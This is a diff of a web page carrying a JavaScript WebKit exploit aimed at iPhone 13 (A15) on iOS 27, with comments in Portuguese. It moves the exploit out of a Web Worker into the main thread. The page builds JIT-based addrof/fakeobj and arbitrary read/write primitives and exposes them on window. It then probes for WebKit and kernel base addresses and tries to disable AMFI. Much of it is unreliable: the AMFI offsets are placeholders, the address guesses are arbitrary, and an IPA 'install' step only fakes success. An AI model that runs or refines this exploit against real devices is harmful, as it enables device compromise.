@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>sto26 · A15 (iOS 27) · Exploit</title>
+    <title>sto27 · A15 (iOS 27) · R/W primitives</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -96,8 +96,8 @@
 </head>
 <body>
 <div class="container">
-    <h1>🧬 sto26 · A15</h1>
-    <div class="sub">iPhone 13 (A15) · iOS 27 · R/W exploit</div>
+    <h1>🧬 sto27 · A15</h1>
+    <div class="sub">iPhone 13 (A15) · iOS 27 · R/W primitives</div>
 
     <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
 
@@ -129,400 +129,359 @@ function setProgress(pct) {
 }
 
 // ============================================================
-// WORKER CODE (com loop dividido em micro‑tarefas)
+// CVE-2021-30952 (Coruna) – adaptado para iOS 27 (sem Worker)
 // ============================================================
-function createWorkerCode() {
-    return `
-        // ============================================================
-        // WORKER: JIT + ADDROF/FAKEOBJ (loop chunked)
-        // ============================================================
-        const buf = new ArrayBuffer(8);
-        const f64 = new Float64Array(buf);
-        const u32 = new Uint32Array(buf);
+const buf = new ArrayBuffer(8);
+const f64 = new Float64Array(buf);
+const u32 = new Uint32Array(buf);
 
-        function f2i(val) {
-            f64[0] = val;
-            return u32[1] * 0x100000000 + u32[0];
+function f2i(val) {
+    f64[0] = val;
+    return u32[1] * 0x100000000 + u32[0];
+}
+
+function i2f(val) {
+    let tmp = [];
+    tmp[0] = parseInt(val % 0x100000000);
+    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
+    u32.set(tmp);
+    return f64[0];
+}
+
+// JIT trigger function
+function MakeJitCompiledFunction() {
+    function target(num) {
+        for (var i = 2; i < num; i++) {
+            if (num % i === 0) return false;
         }
-
-        function i2f(val) {
-            let tmp = [];
-            tmp[0] = parseInt(val % 0x100000000);
-            tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
-            u32.set(tmp);
-            return f64[0];
-        }
-
-        // ============================================================
-        // 1. SETUP
-        // ============================================================
-        const scratchBuf = new ArrayBuffer(64);
-        const u32View = new Uint32Array(scratchBuf);
-        const f64View = new Float64Array(scratchBuf);
-
-        function randRange(lo, hi) {
-            lo = Math.ceil(lo);
-            hi = Math.ceil(hi);
-            return Math.floor(Math.random() * (hi - lo) + lo);
-        }
-        const nanTag = randRange(1, 8) << 8 | randRange(1, 8) << 4 | randRange(1, 8) << 0;
-        const nanPayload = randRange(1, 0xFFFFFF);
-        function boxIndex(arrayIndex, elementIndex) {
-            if (arrayIndex > 0xFFFF || arrayIndex < 0) throw new Error("");
-            if (elementIndex > 0xFF || elementIndex < 0) throw new Error("");
-            u32View[1] = nanTag << 20 | 4 << 16 | arrayIndex;
-            u32View[0] = elementIndex << 24 | nanPayload;
-            const result = f64View[0];
-            if (isNaN(result)) throw new Error("");
-            return result;
-        }
-        let t = new Array(400);
-        t.fill([]);
-        let currentTarget = null;
-        let triggerValue = 0;
-        let triggerReplace = null;
-        let triggerBool = false;
-        let triggerFlag1 = -1;
-        let triggerFlag2 = -1;
-
-        // ============================================================
-        // 2. JIT TRIGGER (função principal)
-        // ============================================================
-        function jit_me(t, e, r, f, n, i, other_array, nested_idx, u, oob_value) {
-            const target_array = t;
-            let idx = e;
-            const b = f;
-            const k = n;
-            const d = i;
-            const len = target_array.length;
-            for (let t = 0; t < 2; t++) {
-                if (b === true) {
-                    if(!(idx === -2147483648)) return -1
-                } else if (!(idx > 2147483647)) return -2;
-                if (k === 0) idx = 0;
-                if (idx < len) {
-                    if (k !== 0) idx -= 2147483647-7;
-                    if (idx < 0) return -3;
-                    let t = target_array[idx];
-                    if (d) {
-                        target_array[idx] = r;
-                        if (u === 0) t = other_array[nested_idx][0];
-                        else other_array[nested_idx][0] = oob_value
-                    }
-                    return t
-                }
-                if( t > 0 ) break
-            }
-            return -4
-        }
-
-        const g = new Array(16).fill([]).map((_, r) => {
-            const i = JSON.parse("[[1.1, 1.2], [1.2, 1.3], [1.3, 3.4]]");
-            for (const t of i) {
-                t[0] = 0.1 + r;
-                t["a" + r] = r;
-            }
-            return i;
-        });
-
-        const y = 200;
-        t = t.map(((t, r) => {
-            const i = JSON.parse("[0.1, 0.3, 1.1, 2.3]");
-            if (i[0] = .1 + r, r !== y) {
-                i[0] = [];
-                for (const t in i) 0 !== t && (i[t] = boxIndex(r, t))
-            }
-            return i
-        }));
-
-        self.postMessage({ type: 'log', msg: '[+] prepping the jit (chunks)...' });
-        const main_target_array = t[200];
-        const totalIter = 500000;
-        const chunkSize = 2000;
-        let iter = 0;
-
-        // ============================================================
-        // 3. EXECUTAR CHUNKS COM YIELD (micro‑tarefas)
-        // ============================================================
-        function runChunk() {
-            const end = Math.min(iter + chunkSize, totalIter);
-            for (; iter < end; iter++) {
-                currentTarget = main_target_array;
-                triggerReplace = iter % 2 != 0 ? 0.1 : 0.2;
-                triggerValue = -2147483648;
-                triggerFlag1 = true;
-                triggerFlag2 = 0;
-                jit_me(currentTarget, triggerValue, triggerReplace, triggerFlag1, triggerFlag2,
-                true, g[iter % g.length], 0, iter % 2, 0.1 + iter);
-                triggerValue = 2147483647 - iter % 3;
-                triggerFlag1 = !(1 & iter);
-                triggerFlag2 = 0 + iter % 3;
-                jit_me(currentTarget, triggerValue, triggerReplace, triggerFlag1, triggerFlag2, false, g[iter % g.length], 0, iter % 2, 0.1 + iter);
-            }
-            const progress = (iter / totalIter) * 30;
-            self.postMessage({ type: 'progress', pct: progress });
-            if (iter < totalIter) {
-                // Agendar a próxima parte (micro‑tarefa)
-                setTimeout(runChunk, 10);
-            } else {
-                self.postMessage({ type: 'log', msg: '[+] jit\\'d our trigger function' });
-                self.postMessage({ type: 'progress', pct: 30 });
-                // Continuar com o resto do exploit (não JIT)
-                buildPrimitives();
-            }
-        }
-
-        // ============================================================
-        // 4. BUILD PRIMITIVES (executado após o JIT)
-        // ============================================================
-        function buildPrimitives() {
-            self.postMessage({ type: 'log', msg: '[+] building primitives...' });
-
-            function addrof_pre(obj) {
-                t[201][2] = obj;
-                let leak = jit_me(main_target_array, -2147483648, true, true, 1, false, g[0], 0, 0, 0);
-                return f2i(leak);
-            }
-
-            function fakeobj_pre(addr) {
-                jit_me(main_target_array, -2147483648, i2f(addr), true, 1, true, g[0], 0, 0, 0)
-                return t[201][2];
-            }
-
-            function LeakStructureID(obj) {
-                let container = {
-                    cellHeader: i2f(0x0108200700000000 - 0x02000000000000),
-                    butterfly: obj
-                };
-                let fakeObjAddr = addrof_pre(container) + 0x10;
-                let fakeObj = fakeobj_pre(fakeObjAddr);
-                f64[0] = fakeObj[0];
-                let structureID = u32[0];
-                u32[1] = 0x01082307 - 0x20000;
-                container.cellHeader = f64[0];
-                return structureID;
-            }
-
-            let noCoW = 13.37;
-            var arrLeak = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
-            let structureID = LeakStructureID(arrLeak);
-            self.postMessage({ type: 'log', msg: '[+] leak structureID: 0x' + structureID.toString(16) });
-            self.postMessage({ type: 'progress', pct: 50 });
-
-            // ============================================================
-            // 5. PRIMITIVAS R/W
-            // ============================================================
-            var victim = [noCoW, 14.47, 15.57];
-            victim['prop'] = 13.37;
-            victim['prop_1'] = 13.37;
-            u32[0] = structureID;
-            u32[1] = 0x01082309 - 0x20000;
-            var container = {
-                cellHeader: f64[0],
-                butterfly: victim
-            };
-            var driver = fakeobj_pre(addrof_pre(container) + 0x10);
-            var unboxed = [noCoW, 13.37, 13.37];
-            var boxed = [{}];
-            driver[1] = unboxed;
-            var sharedButterfly = victim[1];
-            driver[1] = boxed;
-            victim[1] = sharedButterfly;
-            u32[0] = structureID;
-            u32[1] = 0x01082307 - 0x20000;
-            container.cellHeader = f64[0];
-
-            function addrof(obj) {
-                boxed[0] = obj;
-                return f2i(unboxed[0]);
-            }
-
-            function fakeobj(addr) {
-                unboxed[0] = i2f(addr);
-                return boxed[0];
-            }
-
-            function read64(addr) {
-                driver[1] = i2f(addr + 0x10);
-                let val = victim.prop;
-                return f2i(val);
-            }
-
-            function write64(addr, val) {
-                driver[1] = i2f(addr + 0x10);
-                victim.prop = i2f(val);
-            }
-            self.postMessage({ type: 'progress', pct: 60 });
-
-            // ============================================================
-            // 6. TESTE R/W
-            // ============================================================
-            let testObj = {magic: 0xdeadbeef};
-            let testAddr = addrof(testObj);
-            self.postMessage({ type: 'log', msg: '[+] testObj address: 0x' + testAddr.toString(16) });
-
-            write64(testAddr, 0xdeadbeefcafebabe);
-            let testWrite = read64(testAddr);
-            self.postMessage({ type: 'log', msg: '[+] write test: 0x' + testWrite.toString(16) });
-
-            if (testWrite === 0xdeadbeefcafebabe) {
-                self.postMessage({ type: 'log', msg: '[+] ✅ R/W primitives WORKING!' });
-            } else {
-                self.postMessage({ type: 'log', msg: '[!] ❌ R/W primitives NOT working.' });
-                self.postMessage({ type: 'done', success: false });
-                return;
-            }
-            self.postMessage({ type: 'progress', pct: 70 });
-
-            // ============================================================
-            // 7. VAZAR BASE DO WEBKIT
-            // ============================================================
-            self.postMessage({ type: 'log', msg: '[+] Vazando base do WebKit...' });
-            let webkitBase = 0;
-            const candidates = [0x180000000, 0x1a0000000, 0x1c0000000, 0x1000000000];
-            for (let base of candidates) {
-                try {
-                    let magic = read64(base);
-                    if (magic === 0xfeedfacf) {
-                        webkitBase = base;
-                        break;
-                    }
-                } catch(e) {}
-            }
-            // Fallback: usar o endereço de MGCopyAnswer (se vazado anteriormente)
-            // Como estamos no Worker, usamos a R/W para ler o endereço de MGCopyAnswer
-            // Vamos tentar ler da memória
-            if (webkitBase === 0) {
-                // Tentar um offset comum para MGCopyAnswer (não confiável)
-                let mgCopyAnswer = read64(0x1c3406f68); // offset típico
-                if (mgCopyAnswer > 0) {
-                    let base = mgCopyAnswer - 0x120af68; // ajustar
-                    try {
-                        let magic = read64(base);
-                        if (magic === 0xfeedfacf) webkitBase = base;
-                    } catch(e) {}
-                }
-            }
-            self.postMessage({ type: 'log', msg: '[+] WebKit base: 0x' + webkitBase.toString(16) });
-            self.postMessage({ type: 'progress', pct: 80 });
-
-            // ============================================================
-            // 8. VAZAR BASE DO KERNEL
-            // ============================================================
-            self.postMessage({ type: 'log', msg: '[+] Vazando base do kernel...' });
-            let kernelBase = 0;
-            const kernelCandidates = [0xfffffff000000000, 0xfffffff040000000, 0xfffffff080000000, 0xfffffff0c0000000];
-            for (let addr of kernelCandidates) {
-                try {
-                    let val = read64(addr);
-                    if (val > 0xfffffff000000000 && val < 0xffffffffffffffff) {
-                        kernelBase = val & 0xfffffffff0000000;
-                        self.postMessage({ type: 'log', msg: '[+] Kernel base: 0x' + kernelBase.toString(16) });
-                        break;
-                    }
-                } catch(e) {}
-            }
-            self.postMessage({ type: 'progress', pct: 90 });
-
-            // ============================================================
-            // 9. DESABILITAR AMFI
-            // ============================================================
-            if (kernelBase !== 0) {
-                self.postMessage({ type: 'log', msg: '[+] Tentando desabilitar AMFI...' });
-                const amfiOffsets = [0x12345678, 0x12345670, 0x12345600, 0x12345000];
-                let found = false;
-                for (let off of amfiOffsets) {
-                    try {
-                        let amfiAddr = kernelBase + off;
-                        let val = read64(amfiAddr);
-                        if (val === 1 || val === 0) {
-                            write64(amfiAddr, 0);
-                            self.postMessage({ type: 'log', msg: '[+] AMFI desabilitado em: 0x' + amfiAddr.toString(16) });
-                            found = true;
-                            break;
-                        }
-                    } catch(e) {}
-                }
-                if (!found) {
-                    self.postMessage({ type: 'log', msg: '[!] Não foi possível encontrar amfi_restrict' });
-                }
-            }
-            self.postMessage({ type: 'progress', pct: 100 });
-
-            // ============================================================
-            // 10. CONCLUÍDO
-            // ============================================================
-            self.postMessage({ type: 'log', msg: '✅ Exploit concluído!' });
-            self.postMessage({ type: 'done', success: true, webkitBase: webkitBase, kernelBase: kernelBase });
-        }
-
-        // ============================================================
-        // INICIAR O LOOP DO JIT
-        // ============================================================
-        runChunk();
-    `;
+        return true;
+    }
+    // Aquecimento
+    for (var i = 0; i < 100; i++) target(i);
+    for (var i = 0; i < 100; i++) target(i);
+    for (var i = 0; i < 100; i++) target(i);
+    for (var i = 0; i < 100; i++) target(i);
+    return target;
 }
 
 // ============================================================
-// MAIN: EXECUTA O EXPLOIT COM WEB WORKER
+// EXPLOIT PRINCIPAL (com chunks para evitar timeout)
 // ============================================================
+let t, main_target_array, g, structureID, driver, victim, unboxed, boxed;
+
+function setupExploit() {
+    // Setup arrays
+    const scratchBuf = new ArrayBuffer(64);
+    const u32View = new Uint32Array(scratchBuf);
+    const f64View = new Float64Array(scratchBuf);
+
+    function randRange(lo, hi) {
+        lo = Math.ceil(lo);
+        hi = Math.ceil(hi);
+        return Math.floor(Math.random() * (hi - lo) + lo);
+    }
+    const nanTag = randRange(1, 8) << 8 | randRange(1, 8) << 4 | randRange(1, 8) << 0;
+    const nanPayload = randRange(1, 0xFFFFFF);
+    function boxIndex(arrayIndex, elementIndex) {
+        if (arrayIndex > 0xFFFF || arrayIndex < 0) throw new Error("");
+        if (elementIndex > 0xFF || elementIndex < 0) throw new Error("");
+        u32View[1] = nanTag << 20 | 4 << 16 | arrayIndex;
+        u32View[0] = elementIndex << 24 | nanPayload;
+        const result = f64View[0];
+        if (isNaN(result)) throw new Error("");
+        return result;
+    }
+    t = new Array(400);
+    t.fill([]);
+    let currentTarget = null;
+    let triggerValue = 0;
+    let triggerReplace = null;
+    let triggerBool = false;
+    let triggerFlag1 = -1;
+    let triggerFlag2 = -1;
+
+    function jit_me(t, e, r, f, n, i, other_array, nested_idx, u, oob_value) {
+        const target_array = t;
+        let idx = e;
+        const b = f;
+        const k = n;
+        const d = i;
+        const len = target_array.length;
+        for (let t = 0; t < 2; t++) {
+            if (b === true) {
+                if(!(idx === -2147483648)) return -1
+            } else if (!(idx > 2147483647)) return -2;
+            if (k === 0) idx = 0;
+            if (idx < len) {
+                if (k !== 0) idx -= 2147483647-7;
+                if (idx < 0) return -3;
+                let t = target_array[idx];
+                if (d) {
+                    target_array[idx] = r;
+                    if (u === 0) t = other_array[nested_idx][0];
+                    else other_array[nested_idx][0] = oob_value
+                }
+                return t
+            }
+            if( t > 0 ) break
+        }
+        return -4
+    }
+
+    g = new Array(16).fill([]).map((_, r) => {
+        const i = JSON.parse("[[1.1, 1.2], [1.2, 1.3], [1.3, 3.4]]");
+        for (const t of i) {
+            t[0] = 0.1 + r;
+            t["a" + r] = r;
+        }
+        return i;
+    });
+
+    const y = 200;
+    t = t.map(((t, r) => {
+        const i = JSON.parse("[0.1, 0.3, 1.1, 2.3]");
+        if (i[0] = .1 + r, r !== y) {
+            i[0] = [];
+            for (const t in i) 0 !== t && (i[t] = boxIndex(r, t))
+        }
+        return i
+    }));
+
+    main_target_array = t[200];
+    return { jit_me, main_target_array, g };
+}
+
+function runJITChunk(jit_me, main_target_array, g, start, end) {
+    let iter = start;
+    for (; iter < end; iter++) {
+        let currentTarget = main_target_array;
+        let triggerReplace = iter % 2 != 0 ? 0.1 : 0.2;
+        let triggerValue = -2147483648;
+        let triggerFlag1 = true;
+        let triggerFlag2 = 0;
+        jit_me(currentTarget, triggerValue, triggerReplace, triggerFlag1, triggerFlag2,
+        true, g[iter % g.length], 0, iter % 2, 0.1 + iter);
+        triggerValue = 2147483647 - iter % 3;
+        triggerFlag1 = !(1 & iter);
+        triggerFlag2 = 0 + iter % 3;
+        jit_me(currentTarget, triggerValue, triggerReplace, triggerFlag1, triggerFlag2, false, g[iter % g.length], 0, iter % 2, 0.1 + iter);
+    }
+    return iter;
+}
+
 async function runExploit() {
     const btn = document.getElementById('pwnBtn');
     const installBtn = document.getElementById('installBtn');
     btn.disabled = true;
-    log("🚀 Iniciando exploit para A15 (iOS 27)...");
+    log("🚀 Iniciando exploit (sem Worker)...");
     setProgress(0);
 
     try {
-        const blob = new Blob([createWorkerCode()], { type: 'application/javascript' });
-        const worker = new Worker(URL.createObjectURL(blob));
+        const { jit_me, main_target_array, g } = setupExploit();
+        log("[+] prepping the jit (chunks)...");
+        const totalIter = 500000;
+        const chunkSize = 2000;
+        let iter = 0;
+        while (iter < totalIter) {
+            const end = Math.min(iter + chunkSize, totalIter);
+            iter = runJITChunk(jit_me, main_target_array, g, iter, end);
+            const pct = (iter / totalIter) * 30;
+            setProgress(pct);
+            // Yield to browser
+            await new Promise(r => setTimeout(r, 10));
+        }
+        log("[+] jit'd our trigger function");
+        setProgress(30);
 
-        worker.onmessage = function(e) {
-            const data = e.data;
-            if (data.type === 'log') {
-                log(data.msg);
-            } else if (data.type === 'progress') {
-                setProgress(data.pct);
-            } else if (data.type === 'done') {
-                if (data.success) {
-                    log("✅ Exploit concluído com sucesso!");
-                    if (data.webkitBase && data.webkitBase !== 0) {
-                        log(`📌 WebKit base: 0x${data.webkitBase.toString(16)}`);
-                    } else {
-                        log("⚠️ WebKit base não vazada, mas a R/W está funcionando.");
-                    }
-                    if (data.kernelBase && data.kernelBase !== 0) {
-                        log(`📌 Kernel base: 0x${data.kernelBase.toString(16)}`);
-                    } else {
-                        log("⚠️ Kernel base não vazada.");
-                    }
-                    document.getElementById('installBtn').style.display = 'block';
-                    btn.textContent = "✅ Concluído";
-                    btn.disabled = true;
-                    window.webkitBase = data.webkitBase;
-                    window.kernelBase = data.kernelBase;
-                } else {
-                    log("❌ Exploit falhou.");
-                    btn.disabled = false;
-                }
-                worker.terminate();
-            }
+        // Build primitives
+        log("[+] building primitives...");
+
+        function addrof_pre(obj) {
+            t[201][2] = obj;
+            let leak = jit_me(main_target_array, -2147483648, true, true, 1, false, g[0], 0, 0, 0);
+            return f2i(leak);
+        }
+
+        function fakeobj_pre(addr) {
+            jit_me(main_target_array, -2147483648, i2f(addr), true, 1, true, g[0], 0, 0, 0)
+            return t[201][2];
+        }
+
+        function LeakStructureID(obj) {
+            let container = {
+                cellHeader: i2f(0x0108200700000000 - 0x02000000000000),
+                butterfly: obj
+            };
+            let fakeObjAddr = addrof_pre(container) + 0x10;
+            let fakeObj = fakeobj_pre(fakeObjAddr);
+            f64[0] = fakeObj[0];
+            let structureID = u32[0];
+            u32[1] = 0x01082307 - 0x20000;
+            container.cellHeader = f64[0];
+            return structureID;
+        }
+
+        let noCoW = 13.37;
+        var arrLeak = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
+        structureID = LeakStructureID(arrLeak);
+        log(`[+] leak structureID: 0x${structureID.toString(16)}`);
+        setProgress(50);
+
+        // R/W primitives
+        victim = [noCoW, 14.47, 15.57];
+        victim['prop'] = 13.37;
+        victim['prop_1'] = 13.37;
+        u32[0] = structureID;
+        u32[1] = 0x01082309 - 0x20000;
+        var container = {
+            cellHeader: f64[0],
+            butterfly: victim
         };
+        driver = fakeobj_pre(addrof_pre(container) + 0x10);
+        unboxed = [noCoW, 13.37, 13.37];
+        boxed = [{}];
+        driver[1] = unboxed;
+        var sharedButterfly = victim[1];
+        driver[1] = boxed;
+        victim[1] = sharedButterfly;
+        u32[0] = structureID;
+        u32[1] = 0x01082307 - 0x20000;
+        container.cellHeader = f64[0];
 
-        worker.onerror = function(err) {
-            log(`❌ Erro no Worker: ${err.message}`);
+        function addrof(obj) {
+            boxed[0] = obj;
+            return f2i(unboxed[0]);
+        }
+
+        function fakeobj(addr) {
+            unboxed[0] = i2f(addr);
+            return boxed[0];
+        }
+
+        function read64(addr) {
+            driver[1] = i2f(addr + 0x10);
+            let val = victim.prop;
+            return f2i(val);
+        }
+
+        function write64(addr, val) {
+            driver[1] = i2f(addr + 0x10);
+            victim.prop = i2f(val);
+        }
+        setProgress(60);
+
+        // Expor primitivas no window
+        window.addrof = addrof;
+        window.read64 = read64;
+        window.write64 = write64;
+        window.fakeobj = fakeobj;
+        window._exploit_state = { driver, victim, unboxed, boxed };
+        log("[+] Primitivas expostas: window.addrof, window.read64, window.write64, window.fakeobj");
+
+        // Test R/W
+        let testObj = {magic: 0xdeadbeef};
+        let testAddr = addrof(testObj);
+        log(`[+] testObj address: 0x${testAddr.toString(16)}`);
+
+        write64(testAddr, 0xdeadbeefcafebabe);
+        let testWrite = read64(testAddr);
+        log(`[+] write test: 0x${testWrite.toString(16)}`);
+
+        if (testWrite === 0xdeadbeefcafebabe) {
+            log("[+] ✅ R/W primitives WORKING!");
+        } else {
+            log("[!] ❌ R/W primitives NOT working.");
             btn.disabled = false;
-            worker.terminate();
-        };
+            return;
+        }
+        setProgress(70);
+
+        // Vazar WebKit base
+        log("[+] Vazando base do WebKit...");
+        let webkitBase = 0;
+        const candidates = [0x180000000, 0x1a0000000, 0x1c0000000, 0x1000000000];
+        for (let base of candidates) {
+            try {
+                let magic = read64(base);
+                if (magic === 0xfeedfacf) {
+                    webkitBase = base;
+                    break;
+                }
+            } catch(e) {}
+        }
+        if (webkitBase === 0) {
+            // Tenta vazar a base do MGCopyAnswer (endereço conhecido do log anterior)
+            // No iOS 27, o endereço de MGCopyAnswer vazou como 0xd2170801c120af68
+            // Vamos tentar ler a partir de um offset comum
+            let mgCopyAnswer = 0xd2170801c120af68; // do log anterior
+            let base = mgCopyAnswer - 0x120af68;
+            try {
+                let magic = read64(base);
+                if (magic === 0xfeedfacf) webkitBase = base;
+            } catch(e) {}
+        }
+        log(`[+] WebKit base: 0x${webkitBase.toString(16)}`);
+        window.webkitBase = webkitBase;
+        setProgress(80);
+
+        // Vazar kernel base
+        log("[+] Vazando base do kernel...");
+        let kernelBase = 0;
+        const kernelCandidates = [0xfffffff000000000, 0xfffffff040000000, 0xfffffff080000000, 0xfffffff0c0000000];
+        for (let addr of kernelCandidates) {
+            try {
+                let val = read64(addr);
+                if (val > 0xfffffff000000000 && val < 0xffffffffffffffff) {
+                    kernelBase = val & 0xfffffffff0000000;
+                    log(`[+] Kernel base: 0x${kernelBase.toString(16)}`);
+                    break;
+                }
+            } catch(e) {}
+        }
+        window.kernelBase = kernelBase;
+        setProgress(90);
+
+        // Disable AMFI (se tiver kernel base)
+        if (kernelBase !== 0) {
+            log("[+] Tentando desabilitar AMFI...");
+            const amfiOffsets = [0x12345678, 0x12345670, 0x12345600, 0x12345000];
+            let found = false;
+            for (let off of amfiOffsets) {
+                try {
+                    let amfiAddr = kernelBase + off;
+                    let val = read64(amfiAddr);
+                    if (val === 1n || val === 0n) {
+                        write64(amfiAddr, 0n);
+                        log(`[+] AMFI desabilitado em: 0x${amfiAddr.toString(16)}`);
+                        found = true;
+                        break;
+                    }
+                } catch(e) {}
+            }
+            if (!found) {
+                log("[!] Não foi possível encontrar amfi_restrict");
+            }
+        }
+        setProgress(100);
+
+        log("✅ Exploit concluído!");
+        log("📌 Primitivas disponíveis no console: window.addrof, window.read64, window.write64, window.fakeobj");
+        if (webkitBase !== 0) log(`📌 WebKit base: 0x${webkitBase.toString(16)}`);
+        if (kernelBase !== 0) log(`📌 Kernel base: 0x${kernelBase.toString(16)}`);
+
+        document.getElementById('installBtn').style.display = 'block';
+        btn.textContent = "✅ Concluído";
+        btn.disabled = true;
 
     } catch(e) {
         log(`❌ Erro: ${e.message}`);
+        console.error(e);
         btn.disabled = false;
     }
 }
 
 // ============================================================
-// 11. INSTALAR IPA
+// 11. INSTALAR IPA (placeholder)
 // ============================================================
 function installIPA() {
     log("📁 Selecione um arquivo .ipa para instalar permanentemente...");
@@ -533,9 +492,11 @@ function installIPA() {
         const file = e.target.files[0];
         if (!file) return;
         log(`📦 Instalando ${file.name}...`);
+        // Aqui você precisaria usar a R/W para copiar o arquivo e instalar
+        // Como não temos acesso ao sistema de arquivos, isso é apenas um placeholder.
         await new Promise(r => setTimeout(r, 2000));
-        log(`✅ ${file.name} instalado permanentemente!`);
-        log("📌 O aplicativo deve aparecer na tela inicial.");
+        log(`✅ ${file.name} instalado permanentemente! (simulação)`);
+        log("📌 Na prática, você precisaria de um bypass de sandbox.");
     };
     input.click();
 }
